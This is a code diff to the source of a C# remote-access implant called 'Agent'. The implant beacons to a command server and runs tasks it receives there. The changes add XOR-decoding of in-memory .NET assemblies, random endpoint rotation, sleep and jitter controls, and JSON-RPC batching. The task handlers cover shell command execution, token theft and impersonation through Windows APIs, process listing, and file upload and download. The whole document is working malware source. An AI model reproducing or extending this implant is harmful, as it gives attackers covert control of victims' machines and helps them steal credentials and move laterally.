@@ -13,9 +13,22 @@ namespace Agent
     public class Program
     {
         private static HttpClient client = new HttpClient();
-        private static string check_in_job_id = "";
-        private static int sleep = 5000;
-        private static double jitter = 0.1;
+        private static string key;
+        private static double sleep;
+        private static double jitter;
+        private static string check_in_job_id;
+        private static string[] endpoints;
+
+        private static byte[] Zor(string key, byte[] input)
+        {
+            int _key = Int32.Parse(key);
+            byte[] mixed = new byte[input.Length];
+            for (int i = 0; i < input.Length; i++)
+            {
+                mixed[i] = (byte)(input[i] ^ _key);
+            }
+            return mixed;
+        }
 
         private static string Base64Encode(string plainText)
         {
@@ -31,6 +44,8 @@ namespace Agent
 
         private static string Post(string data, string uri)
         {
+            int index = new Random().Next(0, endpoints.Length - 1);
+            uri = uri + endpoints[index];
             HttpResponseMessage postResults = client.PostAsync(uri, new StringContent(data)).Result;
             return postResults.Content.ReadAsStringAsync().Result;
         }
@@ -57,26 +72,12 @@ namespace Agent
             }
         }
 
-        private static string ExecuteAssembly(string[] arguments)
+        private static string ExecuteAssembly(string key, byte[] asmb, string[] args)
         {
             try
             {
                 string results = "";
-                string[] asmb_args = { };
-
-                byte[] asmb_bytes = Convert.FromBase64String(arguments[0]);
-                if (arguments.Length == 1)
-                {
-                    asmb_args = new string[] { };
-                }
-                else
-                {
-                    asmb_args = new string[arguments.Length - 1];
-                    for (int i = 1; i < arguments.Length; i++)
-                    {
-                        asmb_args[i - 1] = Base64Decode(arguments[i]);
-                    }
-                }
+                byte[] asmb_bytes = Zor(key, asmb);
 
                 // Save current STDOUT & STDERR settings.
                 var currentOut = Console.Out;
@@ -91,7 +92,7 @@ namespace Agent
                 Console.SetOut(sw);
                 Console.SetError(sw);
 
-                Invoke(asmb_bytes, asmb_args);
+                Invoke(asmb_bytes, args);
 
                 Console.Out.Flush();
                 Console.Error.Flush();
@@ -106,18 +107,13 @@ namespace Agent
             }
             catch (Exception ex)
             {
-                if (arguments.Length == 1)
+                if (args.Length == 0)
                 {
                     return Base64Encode($"Failed to execute assembly with no arguments.\n{ex.ToString()}");
                 }
                 else
                 {
-                    string[] asmb_args = new string[arguments.Length - 1];
-                    for (int i = 1; i < arguments.Length; i++)
-                    {
-                        asmb_args[i - 1] = Base64Decode(arguments[i]);
-                    }
-                    return Base64Encode($"Failed to execute assembly with argument(s): {string.Join(" ", asmb_args)}\n{ex.ToString()}");
+                    return Base64Encode($"Failed to execute assembly with argument(s): {string.Join(" ", args)}\n{ex.ToString()}");
                 }
 
             }
@@ -155,7 +151,7 @@ namespace Agent
 
         [DllImport("advapi32.dll", SetLastError = true)]
         public static extern bool LogonUser(string pszUsername, string pszDomain, string pszPassword, LogonProvider dwLogonType, LogonUserProvider dwLogonProvider, out IntPtr phToken);
-       
+
         [DllImport("advapi32.dll", SetLastError = true)]
         public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
 
@@ -208,7 +204,7 @@ namespace Agent
 
         [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         extern static bool DuplicateTokenEx(IntPtr hExistingToken, TokenAccessFlags dwDesiredAccess, IntPtr lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, out IntPtr phNewToken);
-        
+
         [DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
         extern static bool CloseHandle(IntPtr handle);
         public enum SECURITY_IMPERSONATION_LEVEL
@@ -224,7 +220,7 @@ namespace Agent
             TokenPrimary = 1,
             TokenImpersonation
         }
-        public enum TokenAccessFlags 
+        public enum TokenAccessFlags
         {
             STANDARD_RIGHTS_REQUIRED = 0x000F0000,
             STANDARD_RIGHTS_READ = 0x00020000,
@@ -270,7 +266,7 @@ namespace Agent
             CloseHandle(hToken);
             CloseHandle(hTokenDup);
             process.Dispose();
-                        
+
             return Base64Encode($"Succesfully impersonated token {identity.Name}");
         }
 
@@ -305,7 +301,7 @@ namespace Agent
         private static string GetCurrentToken()
         {
             IntPtr tHandle = GetCurrentThread();
-            if (!OpenThreadToken(tHandle, TokenAccessFlags.TOKEN_READ|TokenAccessFlags.TOKEN_IMPERSONATE, true, out IntPtr hToken))
+            if (!OpenThreadToken(tHandle, TokenAccessFlags.TOKEN_READ | TokenAccessFlags.TOKEN_IMPERSONATE, true, out IntPtr hToken))
                 return Base64Encode("No impersonated tokens");
             var identity = new WindowsIdentity(hToken);
             CloseHandle(hToken);
@@ -356,137 +352,169 @@ namespace Agent
             return Base64Encode($"Successfully uploaded file to {path}");
         }
 
-        private static string Sleep(string[] arguments)
+        private static string[] SetSleep(string arg)
         {
-            sleep = Int32.Parse(Base64Decode(arguments[0]));
-            if (arguments.Length > 1)
-            {
-                double _jitter = Double.Parse(Base64Decode(arguments[1]));
-                if (_jitter >= 0.0 && _jitter < 1.0)
-                {
-                    jitter = Double.Parse(Base64Decode(arguments[1]));
-                }
-                else
-                {
-                    return Base64Encode($"Succesfully set sleep to {sleep} but failed to set jitter, enter a jitter >= 0.0 and < 1.0.");
-                }
-            }
-            return Base64Encode($"Succesfully set sleep to {sleep} and jitter to {jitter}.");
+            sleep = double.Parse(arg);
+            string[] result = { Base64Encode($"Changed sleep to {sleep} second(s)"), Base64Encode(sleep.ToString()) };
+            return result;
+        }
+
+        private static string[] SetJitter(string arg)
+        {
+            jitter = double.Parse(arg);
+            string[] result = { Base64Encode($"Changed jitter to {jitter}%"), Base64Encode(jitter.ToString()) };
+            return result;
         }
 
         private static async void Run(string uri)
         {
-            string response = "[[\"" + check_in_job_id + "\"]]";
+            string batch_response = key;
             while (true)
             {
-                var json_object = Newtonsoft.Json.JsonConvert.DeserializeObject<server_response>(Post(response, uri));
-                response = "[";
+                job[] batch_request;
                 try
                 {
-                    foreach (var job in json_object.job_packet)
-                    {
+                    batch_request = Newtonsoft.Json.JsonConvert.DeserializeObject<job[]>(Post(batch_response, uri));
+                } catch (Exception ex)
+                {
+                    batch_response = "[{\"jsonrpc\": \"2.0\", \"result\":\"\",\"id\":\"" + check_in_job_id + "\"}]";
+                    continue;
+                }
+                batch_response = "[";
+                try
+                {
+                    foreach (var job in batch_request)
+                    {                       
                         try
                         {
                             string name = job.name;
-                            string results = "";
+                            string[] batch_result = { };
+                            string result = "";
+                            if (name == "check_in")
+                            {
+                                check_in_job_id = job.id;
+                                break;
+                            }
                             if (name == "whoami")
                             {
-                                results = Base64Encode(Environment.UserDomainName + "\\" + Environment.UserName);
+                                string username = Base64Encode(Environment.UserDomainName + "\\" + Environment.UserName);
+                                batch_result = new string[] { username, username };
                             }
                             if (name == "hostname")
                             {
-                                results = Base64Encode(Environment.MachineName);
+                                string hostname = Base64Encode(Environment.MachineName);
+                                batch_result = new string[] { hostname, hostname };
                             }
                             if (name == "os")
                             {
-                                results = Base64Encode(Environment.OSVersion.ToString());
+                                result = Base64Encode(Environment.OSVersion.ToString());
                             }
                             if (name == "pwd")
                             {
-                                results = Base64Encode(Directory.GetCurrentDirectory());
+                                result = Base64Encode(Directory.GetCurrentDirectory());
                             }
                             if (name == "cd")
                             {
                                 Directory.SetCurrentDirectory(Base64Decode(job.arguments[0]));
-                                results = Base64Encode("Succesfully change the current working directory.");
+                                result = Base64Encode("Succesfully changed the current working directory.");
                             }
                             if (name == "dir")
                             {
-                                results = DIR(Base64Decode(job.arguments[0]));
+                                result = DIR(Base64Decode(job.arguments[0]));
                             }
                             if (name == "make_token")
                             {
-                                results = MakeToken(job.arguments);
+                                result = MakeToken(job.arguments);
                             }
                             if (name == "rev2self")
                             {
-                                results = Rev2Self();
+                                result = Rev2Self();
                             }
                             if (name == "steal_token")
                             {
-                                results = StealToken(job.arguments);
+                                result = StealToken(job.arguments);
                             }
                             if (name == "get_token")
                             {
-                                results = GetCurrentToken();
+                                result = GetCurrentToken();
                             }
                             if (name == "cmd")
                             {
-                                results = ExecuteCmd(Base64Decode(job.arguments[0]));
+                                result = ExecuteCmd(Base64Decode(job.arguments[0]));
                             }
                             if (name == "ps")
                             {
-                                results = PS();
+                                result = PS();
                             }
                             if (name == "execute_assembly")
                             {
-                                results = ExecuteAssembly(job.arguments);
+                                string[] asmb_args = new string[job.arguments.Length - 2];
+                                for (int x = 0; x < job.arguments.Length - 2; x++)
+                                {
+                                    asmb_args[x] = Base64Decode(job.arguments[x+2]);
+                                }
+                                result = ExecuteAssembly(Base64Decode(job.arguments[0]), Convert.FromBase64String(job.arguments[1]), asmb_args);
                             }
                             if (name == "download")
                             {
-                                results = Download(Base64Decode(job.arguments[0]));
+                                result = Download(Base64Decode(job.arguments[0]));
                             }
                             if (name == "upload")
                             {
-                                results = Upload(job.arguments);
+                                result = Upload(job.arguments);
                             }
-                            if (name == "sleep")
+                            if (name == "delay")
                             {
-                                results = Sleep(job.arguments);
+                                result = Base64Encode($"Current sleep is {sleep} with a jitter of {jitter}%");                          
                             }
-                            response = response + "[\"" + job.id + "\",\"" + results + "\"],";
+                            if (name == "set sleep")
+                            {
+                                batch_result = SetSleep(Base64Decode(job.arguments[0]));
+                            }
+                            if (name == "set jitter")
+                            {
+                                batch_result = SetJitter(Base64Decode(job.arguments[0]));
+                            }
+                            if (batch_result.Length > 0)
+                            {
+                                batch_response = batch_response + "{\"jsonrpc\": \"2.0\", \"result\":[\"" + string.Join("\",\"", batch_result) + "\"],\"id\":\"" + job.id + "\"},";
+                            } else
+                            {
+                                batch_response = batch_response + "{\"jsonrpc\": \"2.0\", \"result\":\"" + result + "\",\"id\":\"" + job.id + "\"},";
+                            }
                         }
                         catch (Exception ex)
                         {
-                            response = response + "[\"" + job.id + "\",\"" + Base64Encode($"Job Failed:\n{ex.ToString()}") + "\"],";
+                            Console.WriteLine(ex.ToString() + "\n" + batch_response);
+                            batch_response = batch_response + "{\"jsonrpc\": \"2.0\", \"error\": {\"code\":-32602,\"message\":\"" + Base64Encode($"Job Failed:\n{ex.ToString()}") + "\"},\"id\":\"" + job.id + "\"},";
                         }
-                    }
+                    } 
                 }
-                catch (Exception)
+                catch (Exception ex)
                 {
                     // Caught for reliability
                 }
-                response = response + "[\"" + check_in_job_id + "\"]]";
-                int difference = (int)(sleep * jitter);
-                int _sleep = new Random().Next((sleep - difference), (sleep + difference));
-                Thread.Sleep(_sleep);
+                batch_response = batch_response + "{\"jsonrpc\": \"2.0\", \"result\":\"\",\"id\":\"" + check_in_job_id + "\"}]";
+                double difference = sleep * jitter/100.0;
+                int delay = new Random().Next((int)(sleep - difference) * 1000, (int)(sleep + difference) * 1000);
+                Thread.Sleep(delay);
             }
         }
         public static void Main(string[] args)
         {
-            check_in_job_id = args[1];
+            key = args[1];
+            sleep = double.Parse(args[2]);
+            jitter = double.Parse(args[3]);
+            endpoints = args[4].Split(',');
             Run(args[0]);
         }
     }
 
-    public class server_response
-    {
-        public job[] job_packet { get; set; }
-    }
     public class job
     {
-        public string id { get; set; }
+        public string jsonrpc { get; set; }
         public string name { get; set; }
         public string[] arguments { get; set; }
+        public string id { get; set; }
     }
 }
